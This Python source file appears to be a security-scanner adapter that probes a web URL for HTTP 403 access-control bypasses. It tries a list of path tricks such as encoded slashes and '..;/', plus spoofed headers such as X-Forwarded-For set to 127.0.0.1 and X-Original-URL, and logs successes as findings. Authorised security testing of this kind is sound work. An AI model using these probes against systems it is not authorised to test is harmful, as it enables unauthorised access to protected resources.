import httpx
from urllib.parse import urlparse
from typing import AsyncIterator
from nexhunt.adapters.base import ToolAdapter

_PATH_TRICKS = [
    ("/%2f",          "url_encoded_slash"),
    ("/./",           "dot_slash"),
    ("//",            "double_slash"),
    ("/;/",           "semicolon"),
    ("/%20/",         "percent20"),
    ("/%09/",         "percent09"),
    ("/..;/",         "dotdot_semicolon"),
    ("/.randomsuffix","dot_random"),
]

_HEADER_TRICKS = [
    ("X-Forwarded-For",            "127.0.0.1"),
    ("X-Real-IP",                  "127.0.0.1"),
    ("X-Custom-IP-Authorization",  "127.0.0.1"),
    ("X-Originating-IP",           "127.0.0.1"),
    ("X-Remote-IP",                "127.0.0.1"),
    ("X-Remote-Addr",              "127.0.0.1"),
    ("X-Host",                     "127.0.0.1"),
    ("X-Forwarded-Host",           "localhost"),
    ("X-Original-URL",             "/"),
    ("X-Rewrite-URL",              "/"),
    ("Referer",                    "https://127.0.0.1/"),
]


class Bypass403Adapter(ToolAdapter):
    name = "bypass_403"
    binary_name = ""
    result_type = "finding"

    async def check_installed(self) -> bool:
        return True

    async def run(self, target: str, options: dict) -> AsyncIterator[dict]:
        url = target if "://" in target else f"https://{target}"
        yield {"_raw": True, "line": f"$ 403bypass {url}"}

        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        path = parsed.path or "/"

        async with httpx.AsyncClient(verify=False, timeout=10, follow_redirects=False) as client:
            try:
                baseline = await client.get(url)
                orig_code = baseline.status_code
                orig_len = len(baseline.content)
                yield {"_raw": True, "line": f"  Baseline: {orig_code} ({orig_len} bytes)"}
            except Exception as e:
                yield {"_raw": True, "line": f"  Error getting baseline: {e}"}
                return

            def _bypassed(code: int) -> bool:
                return code in (200, 201, 202, 204) and code != orig_code

            for suffix, test_name in _PATH_TRICKS:
                test_url = f"{base}{path}{suffix}"
                try:
                    resp = await client.get(test_url)
                    code, length = resp.status_code, len(resp.content)
                    yield {"_raw": True, "line": f"  [path:{test_name}] {test_url} -> {code} ({length}b)"}
                    if _bypassed(code):
                        yield {
                            "_raw": False, "id": None,
                            "title": f"[403 Bypass] Path trick ({test_name}) — {url}",
                            "severity": "high", "vuln_type": "access-control",
                            "url": test_url, "parameter": "path",
                            "evidence": f"Technique: {test_name}\nURL: {test_url}\nBaseline: {orig_code}\nBypassed: {code} ({length} bytes)",
                            "description": f"403 bypass via path manipulation ({test_name}). {test_url} returned {code}.",
                            "tool": "bypass_403", "template_id": f"403-path-{test_name}", "status": "new",
                        }
                except Exception as e:
                    yield {"_raw": True, "line": f"  [path:{test_name}] error: {e}"}

            for header, value in _HEADER_TRICKS:
                try:
                    resp = await client.get(url, headers={header: value})
                    code, length = resp.status_code, len(resp.content)
                    yield {"_raw": True, "line": f"  [header:{header}] {value} -> {code} ({length}b)"}
                    if _bypassed(code):
                        yield {
                            "_raw": False, "id": None,
                            "title": f"[403 Bypass] Header ({header}) — {url}",
                            "severity": "high", "vuln_type": "access-control",
                            "url": url, "parameter": header,
                            "evidence": f"Header: {header}: {value}\nBaseline: {orig_code}\nBypassed: {code} ({length} bytes)",
                            "description": f"403 bypass via header injection. '{header}: {value}' returned {code}.",
                            "tool": "bypass_403", "template_id": f"403-hdr-{header.lower().replace('-', '_')}", "status": "new",
                        }
                except Exception as e:
                    yield {"_raw": True, "line": f"  [header:{header}] error: {e}"}
